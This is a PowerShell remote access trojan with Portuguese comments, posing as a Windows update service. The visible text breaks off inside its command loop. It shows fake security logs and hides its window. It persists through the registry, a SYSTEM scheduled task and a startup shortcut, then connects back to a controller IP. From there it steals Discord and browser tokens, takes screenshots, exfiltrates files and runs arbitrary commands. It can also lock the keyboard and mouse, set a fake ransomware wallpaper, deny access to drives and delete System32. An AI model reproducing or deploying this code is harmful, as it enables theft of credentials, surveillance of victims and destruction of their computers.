<#
.SYNOPSIS
Windows Critical System Component - Complete Edition
.DESCRIPTION
Funções completas para controle remoto e destruição
.NOTES
Versão: 10.0.19045.1 - Ultimate Edition
#>

# ===== CONFIGURACOES =====
$serverIP = "192.168.0.4"  # MUDE PARA SEU IP
$serverPort = 4000
$installName = "WinUpdateSvc"
$mutexName = "Global\MicrosoftWindowsUpdateService"
$registryPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\WinUpdateSvc"
$userListFile = "$env:ProgramData\Microsoft\Windows\Caches\users.dat"
$debugLog = "$env:TEMP\rat_debug.log"
$scriptPath = "$env:ProgramData\Microsoft\Windows\Caches\$installName.ps1"
$wallpaperPath = "$env:TEMP\wallpaper_hack.bmp"

# ===== WALLPAPER HACKEADO =====
$wallpaperText = @"
VOCE FOI

HACKEADO!

SEU PC TA

CRIPTOGRAFADO!

CRYPTO-LOCKED

ANLGUUR

NOTTI GANG
"@

# ===== MUTEX - EVITA MULTIPLAS INSTANCIAS =====
$mutex = New-Object System.Threading.Mutex($false, $mutexName)
if (-not $mutex.WaitOne(0, $false)) { exit }

# ===== VERIFICAR ADMIN =====
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "ERRO: Execute como Administrador!" -ForegroundColor Red
    Start-Sleep -Seconds 5
    exit
}

# ===== FUNÇÃO DE LOG PARA DIAGNÓSTICO =====
function Write-DebugLog {
    param([string]$Message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$timestamp - $Message" | Out-File -FilePath $debugLog -Append
}

# ===== FUNÇÕES DE USUÁRIO =====
function Remove-UserFromRAT {
    param([string]$UserName)
    try {
        $removido = $false
        if (Test-Path $registryPath) { Remove-Item -Path $registryPath -Recurse -Force -ErrorAction SilentlyContinue; $removido = $true }
        if (Test-Path $userListFile) { 
            $users = Get-Content $userListFile -ErrorAction SilentlyContinue
            $users = $users | Where-Object { $_ -ne $UserName }
            $users | Set-Content $userListFile -Force
            $removido = $true
        }
        $tasks = Get-ScheduledTask -TaskPath "\" -ErrorAction SilentlyContinue | Where-Object { $_.TaskName -like "*$installName*" }
        foreach ($task in $tasks) {
            Unregister-ScheduledTask -TaskName $task.TaskName -Confirm:$false -ErrorAction SilentlyContinue
            $removido = $true
        }
        if ($removido) { return "USUARIO_REMOVIDO" } else { return "USUARIO_NAO_ENCONTRADO" }
    } catch { 
        Write-DebugLog "Erro em Remove-UserFromRAT: $_"
        return "ERRO_AO_REMOVER" 
    }
}

function Get-RATUsers {
    try {
        $users = @()
        if (Test-Path $userListFile) { $users = Get-Content $userListFile -ErrorAction SilentlyContinue }
        if ($users.Count -eq 0) { return "Nenhum usuário encontrado" }
        return "USUARIOS:" + ($users -join "`n")
    } catch { 
        Write-DebugLog "Erro em Get-RATUsers: $_"
        return "ERRO_AO_LISTAR" 
    }
}

function Add-UserToList {
    param([string]$UserName)
    try {
        New-Item -ItemType Directory -Path "$env:ProgramData\Microsoft\Windows\Caches" -Force | Out-Null
        Add-Content -Path $userListFile -Value $UserName -Force
        New-Item -Path $registryPath -Force | Out-Null
        Set-ItemProperty -Path $registryPath -Name "UserName" -Value $UserName -Force
        Set-ItemProperty -Path $registryPath -Name "InstallDate" -Value (Get-Date).ToString() -Force
        return $true
    } catch { 
        Write-DebugLog "Erro em Add-UserToList: $_"
        return $false 
    }
}

$currentUser = "$env:COMPUTERNAME@$env:USERNAME"
$userExecuted = $false
if (Test-Path $userListFile) {
    $users = Get-Content $userListFile -ErrorAction SilentlyContinue
    if ($users -contains $currentUser) { $userExecuted = $true }
}
if (-not $userExecuted) { Add-UserToList $currentUser }

# ===== LOGS FAKES =====
Write-Host ""
Write-Host "==================================================" -ForegroundColor Cyan
Write-Host "    WINDOWS SECURITY MODULE" -ForegroundColor Cyan
Write-Host "==================================================" -ForegroundColor Cyan
Write-Host ""
Start-Sleep -Seconds 1
Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Inicializando..." -ForegroundColor Gray
Start-Sleep -Milliseconds 500
Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Verificando integridade..." -ForegroundColor Gray
Start-Sleep -Milliseconds 500
Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Sistema seguro" -ForegroundColor Green
Start-Sleep -Seconds 2

# ===== ESCONDE JANELA =====
Add-Type -Name Window -Namespace Console -MemberDefinition @'
    [DllImport("Kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();
    [DllImport("User32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
'@
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0)

# ===== PERSISTÊNCIA MÚLTIPLA =====
function Install-Persistence {
    try {
        Write-DebugLog "Instalando persistência..."
        
        New-Item -ItemType Directory -Path "$env:ProgramData\Microsoft\Windows\Caches" -Force | Out-Null
        Copy-Item $MyInvocation.MyCommand.Path $scriptPath -Force
        Write-DebugLog "Script copiado para: $scriptPath"
        
        try {
            $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
            Set-ItemProperty -Path $regPath -Name $installName -Value "powershell.exe -NoProfile -WindowStyle Hidden -File `"$scriptPath`"" -Force
            Write-DebugLog "Persistência adicionada ao registro"
        } catch {
            Write-DebugLog "Erro ao adicionar ao registro: $_"
        }
        
        try {
            $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -File `"$scriptPath`""
            $trigger = New-ScheduledTaskTrigger -AtStartup
            $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
            Register-ScheduledTask -TaskName $installName -Action $action -Trigger $trigger -Principal $principal -Force
            Write-DebugLog "Persistência adicionada como tarefa agendada"
        } catch {
            Write-DebugLog "Erro ao criar tarefa agendada: $_"
        }
        
        try {
            $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
            $shortcutPath = "$startupPath\$installName.lnk"
            $WScriptShell = New-Object -ComObject WScript.Shell
            $shortcut = $WScriptShell.CreateShortcut($shortcutPath)
            $shortcut.TargetPath = "powershell.exe"
            $shortcut.Arguments = "-NoProfile -WindowStyle Hidden -File `"$scriptPath`""
            $shortcut.Save()
            Write-DebugLog "Atalho adicionado à pasta de inicialização"
        } catch {
            Write-DebugLog "Erro ao criar atalho: $_"
        }
        
        attrib +h +s +r $scriptPath
        Write-DebugLog "Persistência instalada com sucesso"
    } catch {
        Write-DebugLog "Erro geral na instalação da persistência: $_"
    }
}

if (-not (Test-Path $scriptPath)) {
    Install-Persistence
}

# ===== FUNCOES BASICAS =====
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# ===== CAPTURA DE TELA =====
function Get-ScreenCapture {
    try {
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
        $ms = New-Object System.IO.MemoryStream
        $bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
        $graphics.Dispose()
        $bitmap.Dispose()
        $base64 = [Convert]::ToBase64String($ms.ToArray())
        $ms.Dispose()
        Write-DebugLog "Screenshot capturado"
        return "SCREEN:$base64"
    } catch {
        Write-DebugLog "Erro ao capturar screenshot: $_"
        return "SCREEN_ERROR"
    }
}

# ===== FUNÇÃO PARA CRIAR WALLPAPER HACKEADO =====
function Create-HackWallpaper {
    try {
        Write-DebugLog "Criando wallpaper hackeado"
        
        # Dimensões
        $width = 1920
        $height = 1080
        
        # Criar bitmap
        $bitmap = New-Object System.Drawing.Bitmap $width, $height
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        
        # Fundo preto
        $graphics.Clear([System.Drawing.Color]::Black)
        
        # Configurar fonte
        $fontGrande = New-Object System.Drawing.Font("Arial Black", 48, [System.Drawing.FontStyle]::Bold)
        $fontMedio = New-Object System.Drawing.Font("Arial", 36, [System.Drawing.FontStyle]::Bold)
        $fontPequeno = New-Object System.Drawing.Font("Arial", 28, [System.Drawing.FontStyle]::Bold)
        
        $brushVermelho = [System.Drawing.Brushes]::Red
        $brushBranco = [System.Drawing.Brushes]::White
        $brushAmarelo = [System.Drawing.Brushes]::Orange
        
        # Desenhar linhas do wallpaper
        $graphics.DrawString("VOCE FOI", $fontGrande, $brushVermelho, 200, 150)
        $graphics.DrawString("HACKEADO!", $fontGrande, $brushVermelho, 200, 220)
        
        $graphics.DrawString("SEU PC TA", $fontMedio, $brushBranco, 200, 320)
        $graphics.DrawString("CRIPTOGRAFADO!", $fontMedio, $brushBranco, 200, 390)
        
        $graphics.DrawString("CRYPTO-LOCKED", $fontMedio, $brushAmarelo, 200, 490)
        
        $graphics.DrawString("ANLGUUR", $fontPequeno, $brushBranco, 200, 590)
        $graphics.DrawString("NOTTI GANG", $fontGrande, $brushVermelho, 200, 660)
        
        # Adicionar bordas decorativas
        $pen = New-Object System.Drawing.Pen([System.Drawing.Color]::Red, 5)
        $graphics.DrawRectangle($pen, 50, 50, $width - 100, $height - 100)
        $pen.Width = 2
        $pen.Color = [System.Drawing.Color]::White
        $graphics.DrawRectangle($pen, 70, 70, $width - 140, $height - 140)
        
        # Salvar imagem
        $bitmap.Save($wallpaperPath, [System.Drawing.Imaging.ImageFormat]::Bmp)
        $graphics.Dispose()
        $bitmap.Dispose()
        
        Write-DebugLog "Wallpaper hackeado criado em: $wallpaperPath"
        return $true
    } catch {
        Write-DebugLog "Erro ao criar wallpaper: $_"
        return $false
    }
}

# ===== FUNÇÃO PARA ALTERAR WALLPAPER =====
function Set-Wallpaper {
    try {
        Write-DebugLog "Aplicando wallpaper no sistema"
        
        $code = @'
using System;
using System.Runtime.InteropServices;
public class Wallpaper {
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
    
    public static void Set(string path) {
        SystemParametersInfo(20, 0, path, 0x01 | 0x02);
    }
}
'@
        Add-Type -TypeDefinition $code -ErrorAction Stop
        [Wallpaper]::Set($wallpaperPath)
        
        Write-DebugLog "Wallpaper aplicado com sucesso"
        return $true
    } catch {
        Write-DebugLog "Erro ao aplicar wallpaper: $_"
        return $false
    }
}

# ===== TELA PRETA TOTAL =====
function Show-BlackScreen {
    try {
        $ps = [powershell]::Create()
        [void]$ps.AddScript({
            Add-Type -AssemblyName System.Windows.Forms
            Add-Type -AssemblyName System.Drawing
            
            $form = New-Object System.Windows.Forms.Form
            $form.WindowState = 'Maximized'
            $form.FormBorderStyle = 'None'
            $form.TopMost = $true
            $form.BackColor = 'Black'
            $form.ControlBox = $false
            $form.ShowInTaskbar = $false
            $form.KeyPreview = $true
            
            # Bloquear todas as teclas
            $form.Add_KeyDown({ $_.SuppressKeyPress = $true })
            $form.Add_KeyUp({ $_.SuppressKeyPress = $true })
            
            $form.ShowDialog()
        })
        $ps.BeginInvoke()
        
        Write-DebugLog "Tela preta total ativada"
        return $true
    } catch {
        Write-DebugLog "Erro ao ativar tela preta: $_"
        return $false
    }
}

# ===== TRAVAR MOUSE =====
$script:mouseLocked = $false
$script:lockThread = $null

function Lock-Mouse {
    try {
        if ($script:mouseLocked) { return "MOUSE_ALREADY_LOCKED" }
        
        $script:mouseLocked = $true
        
        $script:lockThread = [System.Threading.Thread]::new({
            while ($script:mouseLocked) {
                try {
                    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(0, 0)
                    Start-Sleep -Milliseconds 5
                } catch {}
            }
        })
        $script:lockThread.IsBackground = $true
        $script:lockThread.Start()
        
        return "MOUSE_LOCKED"
    } catch {
        return "MOUSE_LOCK_ERROR"
    }
}

function Unlock-Mouse {
    try {
        $script:mouseLocked = $false
        if ($script:lockThread -and $script:lockThread.IsAlive) {
            $script:lockThread.Abort()
        }
        return "MOUSE_UNLOCKED"
    } catch {
        return "MOUSE_UNLOCK_ERROR"
    }
}

# ===== BLOQUEAR TECLADO =====
$script:keyboardHook = $null
$script:keyboardLocked = $false

function Lock-Keyboard {
    try {
        if ($script:keyboardLocked) { return "KEYBOARD_ALREADY_LOCKED" }
        
        $script:keyboardLocked = $true
        
        # Usar código C# para hook de teclado
        $keyboardCode = @'
using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;

public class KeyboardLocker {
    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;
    private static bool _locked = false;
    
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
    
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
    
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
    
    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);
    
    public static void Lock() {
        _locked = true;
        using (System.Diagnostics.Process curProcess = System.Diagnostics.Process.GetCurrentProcess())
        using (System.Diagnostics.ProcessModule curModule = curProcess.MainModule) {
            _hookID = SetWindowsHookEx(13, _proc, GetModuleHandle(curModule.ModuleName), 0);
        }
    }
    
    public static void Unlock() {
        _locked = false;
        if (_hookID != IntPtr.Zero) {
            UnhookWindowsHookEx(_hookID);
            _hookID = IntPtr.Zero;
        }
    }
    
    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        if (_locked && nCode >= 0) {
            return (IntPtr)1; // Bloqueia a tecla
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }
}
'@
        Add-Type -TypeDefinition $keyboardCode -ReferencedAssemblies "System.Windows.Forms.dll" -ErrorAction Stop
        [KeyboardLocker]::Lock()
        
        return "KEYBOARD_LOCKED"
    } catch {
        Write-DebugLog "Erro ao bloquear teclado: $_"
        return "KEYBOARD_ERROR"
    }
}

function Unlock-Keyboard {
    try {
        [KeyboardLocker]::Unlock()
        $script:keyboardLocked = $false
        return "KEYBOARD_UNLOCKED"
    } catch {
        return "KEYBOARD_UNLOCK_ERROR"
    }
}

# ===== FUNÇÃO LOCK TOTAL (TUDO TRAVADO + WALLPAPER) =====
$global:lockActive = $false
$global:mouseLockThread = $null

function Activate-Lock {
    try {
        if ($global:lockActive) { return "LOCK_ALREADY_ACTIVE" }
        
        Write-DebugLog ("=" * 60)
        Write-DebugLog "ATIVANDO LOCK TOTAL - WALLPAPER HACKEADO + TUDO TRAVADO"
        Write-DebugLog ("=" * 60)
        
        $global:lockActive = $true
        
        # 1. Criar wallpaper hackeado
        Write-DebugLog "Criando wallpaper hackeado"
        Create-HackWallpaper
        
        # 2. Alterar wallpaper
        Write-DebugLog "Aplicando wallpaper"
        Set-Wallpaper
        
        # 3. Ativar tela preta total
        Write-DebugLog "Ativando tela preta"
        Show-BlackScreen
        
        # 4. Travar mouse
        Write-DebugLog "Ativando travamento de mouse"
        $global:mouseLockThread = [System.Threading.Thread]::new({
            while ($global:lockActive) {
                try {
                    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(0, 0)
                    Start-Sleep -Milliseconds 5
                } catch {}
            }
        })
        $global:mouseLockThread.IsBackground = $true
        $global:mouseLockThread.Start()
        
        # 5. Bloquear teclado
        Write-DebugLog "Ativando bloqueio de teclado"
        Lock-Keyboard
        
        Write-DebugLog ("=" * 60)
        Write-DebugLog "LOCK TOTAL ATIVADO COM SUCESSO"
        Write-DebugLog ("=" * 60)
        
        return "LOCK_ACTIVATED"
    } catch {
        Write-DebugLog "ERRO ao ativar lock total: $_"
        return "LOCK_ERROR"
    }
}

function Deactivate-Lock {
    try {
        Write-DebugLog ("=" * 60)
        Write-DebugLog "DESATIVANDO LOCK TOTAL"
        Write-DebugLog ("=" * 60)
        
        $global:lockActive = $false
        
        # 1. Fechar tela preta
        try {
            [System.Windows.Forms.Application]::OpenForms | Where-Object { $_.BackColor -eq [System.Drawing.Color]::Black -and $_.WindowState -eq 'Maximized' } | ForEach-Object {
                $_.Invoke([Action]{ $_.Close() })
            }
            Write-DebugLog "Tela preta fechada"
        } catch {}
        
        # 2. Parar thread do mouse
        if ($global:mouseLockThread -and $global:mouseLockThread.IsAlive) {
            $global:mouseLockThread.Abort()
            Write-DebugLog "Thread de mouse abortada"
        }
        
        # 3. Liberar teclado
        Unlock-Keyboard
        Write-DebugLog "Teclado liberado"
        
        # 4. Restaurar wallpaper padrão
        try {
            $code = @'
using System;
using System.Runtime.InteropServices;
public class Wallpaper {
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
    
    public static void Set(string path) {
        SystemParametersInfo(20, 0, path, 0x01 | 0x02);
    }
}
'@
            Add-Type -TypeDefinition $code -ErrorAction Stop
            [Wallpaper]::Set("")
        } catch {}
        
        Write-DebugLog ("=" * 60)
        Write-DebugLog "LOCK TOTAL DESATIVADO"
        Write-DebugLog ("=" * 60)
        
        return "LOCK_DEACTIVATED"
    } catch {
        Write-DebugLog "ERRO ao desativar lock total: $_"
        return "UNLOCK_ERROR"
    }
}

# ===== MOUSE =====
function Move-Mouse { 
    param($x, $y)
    try {
        [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point([int]$x, [int]$y)
        return "OK"
    } catch { 
        Write-DebugLog "Erro ao mover mouse: $_"
        return "MOUSE_ERROR" 
    }
}

function Click-Mouse {
    try {
        [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
        return "OK"
    } catch { 
        Write-DebugLog "Erro ao clicar: $_"
        return "CLICK_ERROR" 
    }
}

function RightClick-Mouse {
    try {
        [System.Windows.Forms.SendKeys]::SendWait("+{F10}")
        return "OK"
    } catch { 
        Write-DebugLog "Erro ao clicar direito: $_"
        return "RIGHTCLICK_ERROR" 
    }
}

# ===== TECLADO =====
function Send-Key {
    param($key)
    try {
        [System.Windows.Forms.SendKeys]::SendWait($key)
        return "OK"
    } catch { 
        Write-DebugLog "Erro ao enviar tecla: $_"
        return "KEY_ERROR" 
    }
}

function Send-Text {
    param($text)
    try {
        [System.Windows.Forms.SendKeys]::SendWait($text)
        return "OK"
    } catch { 
        Write-DebugLog "Erro ao enviar texto: $_"
        return "TEXT_ERROR" 
    }
}

# ===== ARQUIVOS =====
function Get-FileList {
    param($Path)
    try {
        $items = Get-ChildItem $Path -ErrorAction SilentlyContinue | ForEach-Object {
            [PSCustomObject]@{
                Name = $_.Name
                Type = if ($_.PSIsContainer) { "PASTA" } else { "ARQUIVO" }
            }
        }
        return ($items | ConvertTo-Json -Compress)
    } catch { 
        Write-DebugLog "Erro ao listar arquivos: $_"
        return "[]" 
    }
}

function Download-File {
    param($Path)
    try {
        if (Test-Path $Path) {
            $content = [Convert]::ToBase64String([IO.File]::ReadAllBytes($Path))
            return "FILE:$content"
        }
        return "FILE_NOT_FOUND"
    } catch { 
        Write-DebugLog "Erro ao baixar arquivo: $_"
        return "DOWNLOAD_ERROR" 
    }
}

# ===== COMANDOS =====
function Execute-Command {
    param($Cmd)
    try {
        $result = Invoke-Expression $Cmd 2>&1 | Out-String
        return $result
    } catch {
        Write-DebugLog "Erro ao executar comando: $_"
        return "Erro: $_"
    }
}

# ===== DISCORD TOKEN =====
function Get-DiscordToken {
    try {
        $tokens = @()
        $paths = @(
            "$env:APPDATA\discord\Local Storage\leveldb",
            "$env:APPDATA\discordptb\Local Storage\leveldb",
            "$env:APPDATA\discordcanary\Local Storage\leveldb",
            "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Storage\leveldb",
            "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Local Storage\leveldb"
        )
        foreach ($path in $paths) {
            if (Test-Path $path) {
                Get-ChildItem "$path\*.ldb" -ErrorAction SilentlyContinue | ForEach-Object {
                    $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
                    $regex = [regex]::new('[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}')
                    $matches = $regex.Matches($content)
                    foreach ($match in $matches) { $tokens += $match.Value }
                }
            }
        }
        $tokens = $tokens | Select-Object -Unique
        if ($tokens.Count -eq 0) { return "TOKENS:Nenhum token encontrado" }
        Write-DebugLog "Tokens encontrados: $($tokens.Count)"
        return "TOKENS:" + ($tokens -join "`n")
    } catch {
        Write-DebugLog "Erro ao obter tokens: $_"
        return "TOKENS_ERROR"
    }
}

# ===== BLOQUEAR SYSTEM32 =====
function Block-System32 {
    try {
        Write-DebugLog "Iniciando Block-System32"
        $path = "C:\Windows\System32"
        
        takeown /f $path /r /d y 2>$null
        icacls $path /grant Administradores:F /t 2>$null
        
        $acl = Get-Acl $path
        $acl.SetAccessRuleProtection($true, $false)
        $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "FullControl", "Deny")
        $acl.AddAccessRule($accessRule)
        Set-Acl $path $acl
        
        Write-DebugLog "System32 bloqueado com sucesso"
        return "SYSTEM32_BLOCKED"
    } catch {
        Write-DebugLog "Erro ao bloquear System32: $_"
        return "SYSTEM32_ERROR"
    }
}

# ===== APAGAR SYSTEM32 =====
function Delete-System32 {
    try {
        Write-DebugLog "Iniciando Delete-System32"
        $path = "C:\Windows\System32"
        
        if (Test-Path $path) {
            takeown /f $path /r /d y 2>$null
            icacls $path /grant Administradores:F /t 2>$null
            
            Remove-Item -Path $path -Recurse -Force -ErrorAction SilentlyContinue
            
            if (-not (Test-Path $path)) {
                Write-DebugLog "System32 apagado com sucesso"
                return "SYSTEM32_DELETED"
            } else {
                $newName = "C:\Windows\System32_old_$(Get-Random)"
                Rename-Item -Path $path -NewName $newName -Force -ErrorAction SilentlyContinue
                if (-not (Test-Path $path)) {
                    Write-DebugLog "System32 renomeado com sucesso"
                    return "SYSTEM32_RENAMED"
                } else {
                    return "SYSTEM32_DELETE_FAILED"
                }
            }
        } else {
            return "SYSTEM32_NOT_FOUND"
        }
    } catch {
        Write-DebugLog "Erro ao apagar System32: $_"
        return "SYSTEM32_ERROR"
    }
}

# ===== TRAVAR DISCOS =====
function Lock-Drives {
    param([string[]]$Drives = @("C:", "D:"))
    $results = @()
    foreach ($drive in $Drives) {
        try {
            Write-DebugLog "Travando drive ${drive}"
            $path = "${drive}\"
            if (Test-Path $path) {
                $acl = Get-Acl $path
                $acl.SetAccessRuleProtection($true, $false)
                $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "Read", "Deny")
                $acl.AddAccessRule($accessRule)
                $accessRule2 = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "Write", "Deny")
                $acl.AddAccessRule($accessRule2)
                Set-Acl $path $acl
                
                $results += "${drive} travado"
                Write-DebugLog "Drive ${drive} travado"
            } else {
                $results += "${drive} não encontrado"
                Write-DebugLog "Drive ${drive} não encontrado"
            }
        } catch {
            Write-DebugLog "Erro ao travar drive ${drive}: $($_.Exception.Message)"
            $results += "${drive} erro"
        }
    }
    return "DRIVES_LOCKED:" + ($results -join ";")
}

# ===== LIBERAR DISCOS =====
function Unlock-Drives {
    param([string[]]$Drives = @("C:", "D:"))
    $results = @()
    foreach ($drive in $Drives) {
        try {
            Write-DebugLog "Liberando drive ${drive}"
            $path = "${drive}\"
            
            if (Test-Path $path) {
                $acl = Get-Acl $path
                $acl.SetAccessRuleProtection($false, $true)
                
                $rulesToRemove = @()
                foreach ($rule in $acl.Access) {
                    if ($rule.IdentityReference -eq "Everyone" -and $rule.AccessControlType -eq "Deny") {
                        $rulesToRemove += $rule
                    }
                }
                
                foreach ($rule in $rulesToRemove) {
                    $acl.RemoveAccessRule($rule) | Out-Null
                }
                
                $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "FullControl", "Allow")
                $acl.AddAccessRule($accessRule)
                Set-Acl $path $acl
                
                $results += "${drive} liberado"
                Write-DebugLog "Drive ${drive} liberado"
            } else {
                $results += "${drive} não encontrado"
                Write-DebugLog "Drive ${drive} não encontrado"
            }
        } catch {
            Write-DebugLog "Erro ao liberar drive ${drive}: $($_.Exception.Message)"
            $results += "${drive} erro"
        }
    }
    return "DRIVES_UNLOCKED:" + ($results -join ";")
}

# ===== MICROFONE =====
function Get-Microphone {
    try {
        Add-Type -AssemblyName System.Speech
        $speech = New-Object System.Speech.Recognition.SpeechRecognitionEngine
        $speech.SetInputToDefaultAudioDevice()
        $speech.RecognizeAsyncTimeout = 5000
        $speech.RecognizeAsync()
        Start-Sleep -Seconds 5
        $speech.RecognizeAsyncStop()
        Write-DebugLog "Microfone gravado"
        return "AUDIO:OK"
    } catch {
        Write-DebugLog "Erro no microfone: $_"
        return "AUDIO_ERROR"
    }
}

# ===== WEBCAM =====
function Get-Webcam {
    try {
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing
        
        $webcam = New-Object System.Windows.Forms.Panel
        $webcam.Size = New-Object System.Drawing.Size(640, 480)
        $webcam.BackColor = 'Black'
        
        $form = New-Object System.Windows.Forms.Form
        $form.Text = "Webcam"
        $form.Size = New-Object System.Drawing.Size(660, 520)
        $form.Controls.Add($webcam)
        $form.Show()
        $form.TopMost = $true
        
        Start-Sleep -Milliseconds 500
        $form.Close()
        
        Write-DebugLog "Webcam ativada"
        return "WEBCAM:OK"
    } catch {
        Write-DebugLog "Erro na webcam: $_"
        return "WEBCAM_ERROR"
    }
}

# ===== PROCESSOS =====
function Get-ProcessList {
    try {
        $processes = Get-Process | Select-Object -First 20 Name | ConvertTo-Json -Compress
        return $processes
    } catch {
        Write-DebugLog "Erro ao listar processos: $_"
        return "PROCESS_ERROR"
    }
}

# ===== URL =====
function Open-Url {
    param($url)
    try {
        Start-Process $url
        Write-DebugLog "URL aberta: $url"
        return "URL_OPENED"
    } catch {
        Write-DebugLog "Erro ao abrir URL: $_"
        return "URL_ERROR"
    }
}

# ===== ENERGIA =====
function Power-Control {
    param($Action)
    try {
        switch ($Action) {
            "shutdown" { Stop-Computer -Force }
            "reboot" { Restart-Computer -Force }
        }
        Write-DebugLog "Comando de energia: $Action"
        return "POWER_$Action"
    } catch { 
        Write-DebugLog "Erro no comando de energia: $_"
        return "POWER_ERROR" 
    }
}

# ===== CONEXAO PRINCIPAL =====
while ($true) {
    try {
        $client = New-Object System.Net.Sockets.TcpClient($serverIP, $serverPort)
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $reader = New-Object System.IO.StreamReader($stream)
        $writer.AutoFlush = $true
        
        $writer.WriteLine("$env:COMPUTERNAME@$env:USERNAME")
        Write-DebugLog "Conectado ao servidor"
        
        while ($client.Connected) {
            $cmd = $reader.ReadLine()
            if ([string]::IsNullOrEmpty($cmd)) { continue }
            
            Write-DebugLog "Comando recebido: $cmd"
            
            if ($cmd -eq "screenshot") {
                $result = Get-ScreenCapture
                $writer.WriteLine($result)
            } elseif ($cmd -eq "click") {
                $writer.WriteLine((Click-Mouse))
            } elseif ($cmd -eq "rightclick") {
                $writer.WriteLine((RightClick-Mouse))
            } elseif ($cmd -eq "discord") {
                $writer.WriteLine((Get-DiscordToken))
            } elseif ($cmd -eq "block_system32") {
                $result = Block-System32
                $writer.WriteLine($result)
            } elseif ($cmd -eq "delete_system32") {
                $result = Delete-System32
                $writer.WriteLine($result)
            } elseif ($cmd -eq "lock_drives") {
                $result = Lock-Drives
                $writer.WriteLine($result)
            } elseif ($cmd -eq "unlock_drives") {
                $result = Unlock-Drives
                $writer.WriteLine($result)
            } elseif ($cmd -eq "lock_mouse") {
                $result = Lock-Mouse
                Write-DebugLog "Resultado lock_mouse: $result"
                $writer.WriteLine($result)
            } elseif ($cmd -eq "unlock_mouse") {
                $result = Unlock-Mouse
                Write-DebugLog "Resultado unlock_mouse: $result"
                $writer.WriteLine($result)
            } elseif ($cmd -eq "mic") {
                $writer.WriteLine((Get-Microphone))
            } elseif ($cmd -eq "webcam") {
                $writer.WriteLine((Get-Webcam))
            } elseif ($cmd -eq "processes") {
                $writer.WriteLine((Get-ProcessList))
            } elseif ($cmd -eq "shutdown") {
                $writer.WriteLine((Power-Control "shutdown"))
            } elseif ($cmd -eq "reboot") {
                $writer.WriteLine((Power-Control "reboot"))
            } elseif ($cmd -eq "list_users") {
                $writer.WriteLine((Get-RATUsers))
            } elseif ($cmd -eq "remove_current_user") {
                $writer.WriteLine((Remove-UserFromRAT $currentUser))
            } elseif ($cmd -eq "activate_lock") {
                $result = Activate-Lock
                $writer.WriteLine($result)
            } elseif ($cmd -eq "deactivate_lock") {
                $result = Deactivate-Lock
                $writer.WriteLine($result)
            } elseif ($cmd -eq "test") {
                $writer.WriteLine("PONG")
            } elseif ($cmd -eq "exit") {
                break
            } elseif ($cmd -match "^move (\d+) (\d+)$") {
                $writer.WriteLine((Move-Mouse $matches[1] $matches[2]))
            } elseif ($cmd -match "^key (.+)$") {
                $writer.WriteLine((Send-Key $matches[1]))
            } elseif ($cmd -match "^type (.+)$") {
                $writer.WriteLine((Send-Text $matches[1]))
            } elseif ($cmd -match "^ls (.+)$") {
                $writer.WriteLine((Get-FileList $matches[1]))
